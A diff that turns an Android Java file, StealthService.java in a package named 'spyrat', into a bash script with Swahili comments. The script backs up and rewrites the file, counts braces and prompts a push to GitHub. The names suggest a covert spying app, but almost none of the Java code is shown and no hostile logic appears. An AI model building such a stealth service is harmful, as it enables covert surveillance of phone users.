@@ -1,3 +1,14 @@
+#!/bin/bash
+
+# Script ya kuandika upya StealthService.java kwa usahihi
+
+echo "=== KUANDIKA UPYA STEALTHSERVICE.JAVA ==="
+
+# Backup faili ya zamani
+cp app/src/main/java/com/spyrat/investigation/StealthService.java StealthService.backup3.java
+
+# Andika faili mpya kwa usahihi
+cat > app/src/main/java/com/spyrat/investigation/StealthService.java << 'EOF'
 package com.spyrat.investigation;
 
 import android.app.Service;
@@ -444,3 +455,19 @@ public class StealthService extends Service {
         }
     }
 }
+EOF
+
+echo "✅ StealthService.java imeandikwa upya kwa usahihi!"
+
+# Angalia mwisho wa faili
+echo ""
+echo "=== MWISHO WA FAILI ==="
+tail -5 app/src/main/java/com/spyrat/investigation/StealthService.java
+
+# Angalia mabano
+echo ""
+echo "=== HESABU MABANO ==="
+echo "Mabano ya kufungua { : $(grep -o "{" app/src/main/java/com/spyrat/investigation/StealthService.java | wc -l)"
+echo "Mabano ya kufunga } : $(grep -o "}" app/src/main/java/com/spyrat/investigation/StealthService.java | wc -l)"
+
+echo "🎉 FAILI IMEREKEBISHWA! Sasa push tena kwenye GitHub."
